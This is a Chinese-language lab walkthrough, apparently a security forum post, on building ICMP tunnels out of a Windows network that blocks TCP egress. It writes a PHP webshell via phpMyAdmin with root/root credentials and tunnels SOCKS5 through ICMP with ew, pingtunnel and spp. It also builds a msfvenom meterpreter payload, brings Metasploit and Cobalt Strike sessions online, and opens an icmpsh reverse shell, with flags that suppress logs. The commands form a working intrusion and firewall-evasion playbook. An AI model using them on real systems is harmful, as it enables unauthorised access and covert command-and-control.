前言
--

在后渗透中内网隧道是必不可少的，在能够TCP出网的情况下搭建隧道是最容易的，使用frp即稳定又方便，搭建几级代理都不是问题。但是也有很多TCP不出网的情况，在这种场景下搭建隧道就要另寻门路了。为了方便学习内网隧道技术，我在公司的内网环境搭建了基于windows系统的苛刻的隧道环境，其实很简单，都是windows自带防火墙的一些规则策略。通过各种尝试，终于完成此环境(不知道有没有别的问题)，现在把过程分享给大家\\~路过的师傅都来看看呀，有不正确的地方求教教我^^

![001](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9ae5b794f3d010d8b3443077d86dfedc4744fc00.png)

通过环境搭建，满足以下条件：

192.168.3.76(kali)模拟公网vp/s地址，WEB服务器1(windows server2019)模拟公司对外提供Web服务的机器，该机器可以通内网，同时向公网提供服务。内网同网段存在一台WIndows内网服务器，Web服务器可以访问该机器远程桌面。当我们拿到web服务器1的shell之后发现只能使用icmp协议访问公网vp/s（ping），所以只能用ICMP搭建通往内网的隧道，访问内网服务器进行后续攻击操作。

**windows环境：**

系统：windows server 2019(WEB服务器)、windows server2008 R2(内网服务器)

WEB服务器1使用phpstudy搭建web服务，防火墙配置策略能访问内网服务器。隧道打通之后可以用来访问内网服务器远程桌面测试。

工具：phpstudy

用来开启web服务，web服务直接使用phpstudy默认功能即可（phpstudy探针+phpmyadmin弱口令）。WEB服务器防火墙入站规则仅开启80端口TCP，用来攻击获取shell。

一、获取WEB服务器shell
---------------

### 1 phpstudy探针得到网站路径

```php
C:/phpStudy/WWW
```

![055](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-afcfe3efbfa98e2a0a5bb345b477c1c78cfd28a5.jpg)

### 2 phpmyadmin弱口令root/root

```php
http://192.168.3.88/phpmyadmin
```

通过phpstudy开启的服务，使用弱口令连接phpmyadmin

![056](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-53c13778978999c4411ccc0789eabb8dcfff0c74.jpg)

### 3 写入webshell

```php
show global variables like '%secure_file_priv%';

NULL    不允许导入或导出
/tmp    只允许在 /tmp 目录导入导出
空      不限制目录
```

这里是空值

![057](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b041f0bab550512431d243a672566f81bd3bae24.jpg)

写入webshell

```php
select '&amp;lt;?php @e val($_POST[ch4nge]);?&amp;gt;' into outfile 'C:/phpStudy/WWW/ch4nge.php';
```

![058](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-169f9c978b626d3ca69e3f44a0be3e508caa8af3.jpg)

### 4 蚁剑连接

![059](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ed44753f44bc8c4db479b1b1861a9b06f5da14c1.jpg)

二、ew+pingtunnel组合建立socks5隧道
---------------------------

**ew**

EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。

```php
https://github.com/idlefire/ew
```

**pingtunnel**

pingtunnel 是把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具

**注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件**

**由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密**

```php
https://github.com/esrrhs/pingtunnel
```

### 1 v/ps-kali执行

```php
./ew_for_linux64 -s rcsocks -l 10080 -e 8898

./pingtunnel -type server
```

将8898收到的请求转发至10080端口

![060](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c9840624cff6f93bdaa8af8dcbe55b15be38c6c8.jpg)

![061](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1ce4f23fdd22ca27a1c16cfe064dca125b8336ce.jpg)

### 2 WEB服务器执行pingtunnel

```php
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 192.168.3.76 -t 192.168.3.76:8898 -sock5 -1 -noprint 1 -nolog 1
```

![62.jpg](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5778090782b062241d0bac835081adfb073ac6f2.jpg)

![063](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aa0cafbf8e617244ca087c9e6ebc40776566aeca.jpg)

### 3 WEB服务器执行ew

```php
ew.exe -s rssocks -d 127.0.0.1 -e 9999
```

![064](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c2758b1bbbb98be1f8ad23b521234d498c3b54a2.jpg)

ew回显OK，隧道已打通！

![065](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b85606852844d50d3f6cc93d571d466d5b23e41e.jpg)

### 4 连接代理

使用proxifier设置代理

![066](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-63edbe54db067c90a9e386292aa683d0f73e0708.jpg)

远程桌面测试

![067](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a28f91dfc935584b2a0767c081284da25303b3d7.jpg)

远程桌面测试

![068](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bea07bbd96d54a54f41b4f7e48b4f61d8807fa93.jpg)

![069](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d170afab54664b3b7de4f2bc8af5e3003f0f2c55.jpg)

![070](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-350a992e01ed6dcf6988e48ffb4397e6cdaa06e5.jpg)

三、pingtunnel上线MSF&amp;amp;CS
----------------------------

### 1 pingtunnel下载链接

**注意，在客户端中运行一定要加noprint nolog两个参数，否则会生成大量的日志文件**

**由于ICMP为网络层协议，应用层防火墙无法识别，且请求包当中的数据字段被加密**

```php
https://github.com/esrrhs/pingtunnel/releases
```

### 2 v/ps服务端开启

```php
./pingtunnel -type server        ##开启服务器模式
```

回显0连接

![071](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ace85cb53d1c0426e3f93fac5418d5b3124718f1.jpg)

### 3 客户端开启

上传客户端

![072](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ecf1e05d404685d0ef195f632c320b2ffdeb70de.jpg)

```php
pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1

pingtunnel.exe -type client -l 127.0.0.1:9999 -s 192.168.3.76 -t 192.168.3.76:7777 -tcp 1 -noprint 1 -nolog 1
```

![073](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ce305d9f1ba330b6ba4ab24ab32daab05368d004.jpg)

客户端本地监听9999端口 ，将监听到的连接通过icmpserver发送到Linsten\_ip:7777端口

执行后，kali有回显

![074](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-433a06ffcddd17a3992f2ddf0e75849588d0eeed.jpg)

### 4 MSF上线

制作木马，木马的回连地址为127.0.0.1:9999,运行上线  
MSF

```php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f exe -o ch4nge.exe
```

![075](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-92850d44cf6d6cc68183445f5a1c57758d50f8eb.jpg)

监听

```php
msfconsole -x &amp;quot;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.3.76; set lport 7777; exploit -j; &amp;quot;
```

![076](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ace773221ac939303182b78cef3ef4f15f6ad7b7.jpg)

把木马ch4nge.exe从蚁剑上传到靶机，运行  
![077](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7ad35b989d49afad27bbf08414c320dbd285dfc2.jpg)

![078](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc366fa59a1aac28c2ec5d25327e6bca45bdd1c2.jpg)

### 5 CS上线

```php
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 192.168.3.76 -t 192.168.3.76:7777 -tcp 1 -noprint 1 -nolog 1
```

建立监听127.0.0.1:9999和192.168.3.76:7777

![079](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-09dd593f0935b41ddf5173cc078f70279a28bbfe.jpg)

对ICMP-127的监听生成木马ch4nge2.exe，传到靶机运行

![080](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7d066c1add3bd5065b252de1d2547b477ae5e5c0.jpg)

CS监听上线

![081](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-17b9bd213b7fa17cc51ffcbefb0a226846cb20db.jpg)

![082](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dd5c53b55306c179b62ce45be7dda3f0c5110b8e.jpg)

四、spp搭建socks5隧道
---------------

**反向代理用于进入目标内网，正向代理可配合远控工具进行上线**

```php
功能

支持的协议：tcp、udp、rudp(可靠udp)、ricmp(可靠icmp)、rhttp(可靠http)、kcp、quic
支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理
协议和类型可以自由组合
外部代理协议和内部转发协议可以自由组合
支持shadowsock/s插件，spp-shadowsock/s-plugin，spp-shadowsock/s-plugin-android
```

### 1 下载

```php
https://github.com/esrrhs/spp
https://github.com/esrrhs/spp/releases
```

### 2 V/PS执行

```php
./spp -type server -proto ricmp -listen 0.0.0.0
```

![083](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d2297df36033c157f9e2abe2e0cc84b90e46ecf9.jpg)

### 3 WEB服务器执行

```php
spp.exe -name &amp;quot;test&amp;quot; -type reverse_socks5_client -server v/ps -fromaddr :8080 -proxyproto tcp -proto ricmp

spp.exe -name &amp;quot;test&amp;quot; -type reverse_socks5_client -server 192.168.3.76 -fromaddr :8080 -proxyproto tcp -proto ricmp
```

![084](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6d811c68719436d39c16686a936eab1b1e7ecdfb.jpg)

V/PS回显

![085](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5593a5c6a9fb6a86c13d775512374f080245f18e.jpg)

![086](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3f6343ede54f4703ae868b0e13876834a435e56.jpg)

成功搭建隧道！

### 4 设置代理

socks5:v/ps:8080

192.168.3.76:8080

![087](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a1fc74e2063dc224c54512f0f48594c5b2f81542.jpg)

远程连接内网服务器

![088](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b50233786fc7863f5aa17df8256ebd22e2619e13.jpg)

![089](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56e6d2d35998cc2cf7de053e4cc422ca091fb645.jpg)

结束！

五、spp上线CS
---------

### 1 V/PS执行

```php
./spp -type server -proto ricmp -listen 0.0.0.0
```

![090](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d7c239dceb982e458c0bbb7b28e3de9606dfeacf.jpg)

### 2 WEB服务器执行

```php
spp -name &amp;quot;test&amp;quot; -type proxy_client -server v/ps -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp

spp -name &amp;quot;test&amp;quot; -type proxy_client -server 192.168.3.76 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp

# -nolog 1不输出日志，-noprint 1不打印内容
spp.exe -name &amp;quot;test&amp;quot; -type proxy_client -server 192.168.3.76 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp -nolog 1 -noprint 1
```

![091](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d8e8e99b38039fe40e8a17a64543b5775e975690.jpg)

### 3 CS监听上线

建立监听127.0.0.1:8082和192.168.3.76:8081

![092](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e6aa9556b9a0e8c846924baaa798138fbeb10dbf.jpg)

对spp-127的监听生成木马ch4nge3.exe，传到靶机运行

**CS监听上线**

![093](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7d18d4ba737f17250f79a191488b745bed553482.jpg)

V/PS回显

![094](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3f115edddc41a63f27997ffcdc22b60ee9d42363.jpg)

**wireshark捕获数据**

![095](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f10157c738e6fb1ec6de20a3865cc0c807415d09.jpg)

六、icmpsh反弹shell
---------------

### 0 icmpsh简介

icmpsh 是一个简单的反向 ICMP shell，带有一个 win32 从站和一个 C、Perl 或 Python 中的 POSIX 兼容主站。与其他类似的开源工具相比，它的主要优势在于它不需要管理权限即可在目标机器上运行。

该工具干净、简单且便携。该目标Windows机器上从（客户端）运行，它是用C写的，在Windows受害者机器上运行服务器端，在攻击者机器上的任何平台上运行服务端。

### 1 下载地址

```php
https://github.com/bdamele/icmpsh
```

### 2 工具安装

**如果遇到报错，请看下面的报错解决方法**

```php
#下载工具
git clone https://github.com/inquisb/icmpsh.git
#安装依赖
apt-get install python-impacket
#关闭本地ICMP应答
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

### 3 V/PS-kali运行icmpsh的控制端

```php
python icmpsh_m.py v/ps-ip attack-ip

python icmpsh_m.py 192.168.3.76 192.168.3.88
```

![096](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e6cbec9bb07b9adf9ba406f8b4b9ca9d370afffa.jpg)

### 4 WEB服务器运行

```php
icmpsh.exe -t 192.168.3.76
```

![097](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fefe1baba5f067538fbb1bd4fb843c212eedc85f.jpg)

v/ps接收到shell

![098](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-200b965dbdfd3e2fd5a7e931df8d2b5224735115.jpg)

使用wireshark抓包可以看到数据包都是ICMP协议

![099](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23d586e84c9b51bcfad7388c01da296bda810d71.jpg)

### 5 报错解决

`You need to&amp;lt;span&amp;gt; &amp;lt;/span&amp;gt;``install``Python Impacket library first`

解决：

```php
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install -r requirements.txt
python setup.py install
```

如果第三行命令报错

![100](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-703fe6f9cc45cc94ec32da5c37ec701034b7c21c.jpg)

切换普通用户再执行

![101](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-879e946bb927212dea6e734789befc03f0fc461e.jpg)

安装完成后切换用户进行监听

### 6 局限性

V/PS和WEB服务器必须要能够相互ping通

七、附：隧道场景搭建
----------

windows server 2019环境-icmp出网环境搭建记录

### 1 WEB服务器环境搭建

设置Windows防火墙策略

### 1） 启用防火墙

![002](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f70d10989f814b0d52f0068091f563cfa4c8ced8.png)

### 2） 防火墙高级设置（重点）

**（1）设置阻止入站/出站连接**

打开高级设置

![003](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-68f2269bfce2b3613e802ae7ffdf736eba346b6e.jpg)

选择属性

![004](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0399ef831fb505b8440274713e2fc640249456e4.jpg)

![005](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-48e8a30af50961c9784fdb8b9eec61951ad4a24d.jpg)

域配置文件、专用配置文件、公用配置文件这三个标签中出站连接设置为阻止，确定

再次查看

![006](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6853f02a990bb7ea97d500a03f2b12b34921c736.jpg)

**（2）禁用全部已启用的入站规则**

选择入站规则，按照已启用排序，把启用的规则选中，全部禁用

![007](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-54cf837d86c47daf970b6062ecc75d26be3bf37b.jpg)

![008](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ab443acf7139f9d29b5e02972326f96f04dc7079.jpg)

**（3）新建入站规则：允许80端口tcp入站**

新建一个web服务，仅TCP的80端口入站

![009](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-115055f13e521bdf2a0960f3d11a8e0fd2b80863.jpg)

选择端口，下一步

![010](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7fc9f76988551c523c1658c0bfa8980b81f5f374.jpg)

选择tcp，输入特定端口80

![011](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca5121950f4fcca609edcb79752dbfda79614356.jpg)

默认选择允许连接，下一步

![012](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2e0af5743e5f4bfe0005bc6ec774e494f9e3fe64.jpg)

选择专用 公用，下一步

![013](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bf045c120264d3ca72b2c34ee4e35dff3ffde4bf.jpg)

随便命名，完成

![014](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-78f0150ddcb228347e5568d6bc249574aa2429c8.jpg)

**（4）新建出站规则：允许ICMP协议出站**

禁用全部已启用的出站规则：同样点击出站规则，把启用的全部禁用掉

新建一个基于icmp协议的规则

![015](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27fcd856f6af51078e6b7b9db2820510a0bde57b.jpg)

选择自定义，协议和端口

![016](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8102ea5eeed26a1621ea5ea1ad75e56cd21dde40.jpg)

默认，下一步

![017](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1df22568cb0794558a1f267ecd94a5ae2b410231.jpg)

协议类型选择icmpv4，其余默认，下一步。&amp;quot;这里可以查看几个协议的协议号&amp;quot;

![018](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66c55d1fabfb0a446c5ae4939cb7c4294be3e868.jpg)

作用域默认任何IP地址，下一步

![019](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-962e696974555c9b18e3555a7b26abaed0e354fe.jpg)

选择允许连接，下一步

![020](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b10215f65096c34fbc8fea9050c235302a32aba8.jpg)

选择专用、公用，下一步

![021](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-949a3f00bd60942c525ee787bed0838d75b37b9a.jpg)

输入命名，完成

![022](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c70a025831de907ecdcad9fdc0e81d1bdda12323.jpg)

- - - - - -

**（5）新建出站规则：允许连接内网服务器**

开启对内网服务器172.16.5.100所有访问权限。

![023](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-678e39ab80a29ba975666b08b301afd19c161ce6.jpg)

选择自定义，下一步

![024](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c64713d7a83f4d494468e685ef68f34193f41a64.jpg)

默认选择所有程序，下一步

![025](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1dc3dbe1d1e69c816f04d90b513a7b2301e6b4e2.jpg)

默认，下一步

![026](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16faac2dba687267858f242ee14ba5fd7cca2e07.jpg)

远程ip地址设置为176.16.5.100

![027](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-059fb88aabbeb7bf4559ab01fd1cf72bcd49806a.jpg)

选择允许连接，下一步

![028](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-daae73b481bdec6464fbfd7ac0c66947a2c7b396.jpg)

选择专用、公用，下一步

![029](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3af0a3e39596c2c6105091ea79240b4bfbbcc70c.jpg)

![030](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-74e72c6fb04f22fa644b3c1828feec45eff14d77.jpg)

**（6）新建入站规则：允许远程桌面连接自己**

用来对Ptunnel工具测试使用

新建入站规则，选择自定义，下一步

![031](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-55d79ae6380062fa6bb77c9740630eea0c8ff320.jpg)

默认，下一步

![032](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3f45657941b3d8b49aa89344fd29005bd2a0ca3b.jpg)

默认，下一步

![033](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f3ceba1af2f9c2ed2b3bbf81089a60aa770af64.jpg)

这里设置远程ip地址为本地地址（这里没有过多测试，这样设置能达到目的）

![034](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ed82d44921d37f6d77f045c68c341ac43db1a6a8.jpg)

默认，允许连接，下一步

![035](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c2e70c1ec413d7c1d0c70f883d23984c075173d9.jpg)

选择专用、公用，下一步

![036](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3cc53051f078325ce9998a24d995e5422361a68b.jpg)

命名，完成

![037](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61724b64aadf5e298e2ed7f7f8a294e259e7bc9e.jpg)

### 3） phpStudy搭建WEB服务

先安装vc9\_x86.exe，然后安装phpstudy。路径C:\\phpstudy

![038](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-db9361cf013387118cd1a0af7383787eb961ddff.jpg)

### 4） 关闭windows病毒与威胁防护

![039](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a71944252b211e79ca3cc1488977d8475c0bdec6.jpg)

- - - - - -

### 2 内网服务器环境搭建

### 1） 开启防火墙

![040](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-abfd1ad7ccc3f656d206e2d43c83c6ff2b1d5d6b.jpg)

### 2） 禁用所有开启的入站规则，新建入站规则：仅允许WEB服务器访问

新建规则

![041](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-53a521ef4827abe0c272c5b822d547fbaab8c263.jpg)

选择自定义，下一步

![042](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-24c5693b13a7c34479a0fc1587358080ccb1beb0.jpg)

默认所有程序，下一步

![043](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3a641063ca5f17cc06c8dc43c37464438c98fa30.jpg)

默认，下一步

![044](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-911aab005a35754821af2dd36d048979786a78e5.jpg)

远程IP只写一个172.16.5.60（WEB服务器第二网卡）

![045](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4ff123df13dfec7597ee1d91552612be480a156e.jpg)

默认，下一步

![046](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-397d8462b30ad5db11f27a15cbf4f54c86654cdd.jpg)

选择专用、公用，下一步

![047](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d21c003d884e935102fc7e5deafae74e5db528e4.jpg)

命名，完成

![048](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee3bcaa867ee90a659893bddc8252182509ebd30.jpg)

### 3） 开启允许远程桌面

![049](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-516848de3acd6ae3a5048721f7a25a8d818b1e04.jpg)

### 4） 环境测试

**80端口tcp入站情况测试**

开启服务后，windows攻击机可以通过ip进行访问web服务

![050](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1f9d988c277172818c8d06a366f080b6a44d5e12.jpg)

**ping测试**

windows攻击机不能ping通环境机器

![051](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-661582fb22b18df7d4720424b32803d9465959e1.jpg)

环境机器可以ping通其他机器

![052](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bb33ce0ed687cc38dc9dba8b786549f2d038a9ea.jpg)

**环境tcp不出网测试**

环境机器无法访问百度的网站（tcp）

![053](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7fbed050eae9dd0bb0ec8d1ea4ae3d6119a55552.jpg)

只能访问172.16.5.100的服务

![054](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ba7d1fc6bccd7b11bb2fc621a858249192245cd7.jpg)

八、参考文章&amp;amp;&amp;amp;工具下载
----------------------------

**spp**参考https://xz.aliyun.com/t/9820#toc-11

**pingtunnel**参考[perng师傅](https://https//www.perng.cn)文章

**工具下载**

```php
链接：https://pan.baidu.com/s/1_O8-1zpno7siXiXiL_B4NQ
提取码：nhxn
```